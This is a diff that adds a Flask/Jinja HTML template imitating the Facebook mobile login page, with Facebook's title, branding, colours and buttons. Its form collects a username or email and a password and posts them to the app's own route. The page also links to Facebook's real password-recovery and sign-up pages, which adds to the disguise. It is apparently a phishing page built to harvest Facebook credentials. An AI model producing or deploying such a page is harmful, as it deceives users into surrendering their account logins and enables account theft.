@@ -1,0 +1,167 @@
+<Doctype html!>
+
+<html
+
+<head>
+<title>Facebook</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+<style>
+
+#fg{
+color:#0080FF;
+
+}
+
+
+
+
+
+
+body {
+font-family:arial;
+background-color:white;
+
+}
+.Input{
+
+border-color:white;
+height:49px;
+width:295px;
+margin:3px;
+border-radius:5px;
+height:50px;
+border: 1px solid #ddd;
+outline-color: #0080ff;
+color: black;
+
+
+}
+.Input:hover{
+border-color:3px solid red;
+
+}
+
+
+
+.Size{
+width:60px;
+height:10px;
+
+}
+
+#head{
+color:#0080FF;
+text-align:center;
+}
+
+#login{
+background-color:#0080FF;
+width:295px;
+height:49px;
+color:white;
+font-size:20px;
+border:1px solid #0080FF;
+border-radius:5px;
+margin:3px;
+margin-top:-12px;
+}
+
+#newacc{
+
+background-color:#32CD32;
+color:white;
+border:1px solid #32CD32;
+border-radius:5px;
+margin:50px;
+width:200px;
+height:40px;
+font-size:20px;
+}
+
+
+
+#copy{
+font-size:15px;
+margin-left:33%;
+color:grey;
+
+
+
+}
+
+</style>
+
+</head>
+
+
+{% block content %}
+
+
+{% with messages = get_flashed_messages()%}
+
+	{% if messages %}
+		{% for msg in messages %}
+			<p style="color:red">{{msg}}</p>
+		
+		{%endfor%}
+
+
+
+	{%endif%}
+
+
+
+
+{%endwith%}
+
+
+<body>
+
+
+<div id = "head">
+<h1>facebook</h1>
+</div>
+
+
+<div>
+
+<form action = "#" method="post">
+
+<input class = "Input" type="username" placeholder="Phonenumber or email" required name = "username">
+<br>
+
+<br>
+
+<div>
+
+
+<input  class = "Input" type="password" placeholder="password" height="100" id = "Show" required="Password should not be empty" name = "password">
+
+
+</div>
+<br>
+
+<Button id = "login" type="submit">Log In</Button>
+</form>
+<a style="text-decoration:none" href = "https://m.facebook.com/recover/initiate/">
+<p id = "fg">forgot password?</p>
+
+</a>
+
+</div>
+
+<a href = "https://m.facebook.com/reg/">
+
+<Button id = "newacc">Create new account</Button>
+
+</a>
+
+
+</body>
+{% endblock %}
+
+
+
+</html>
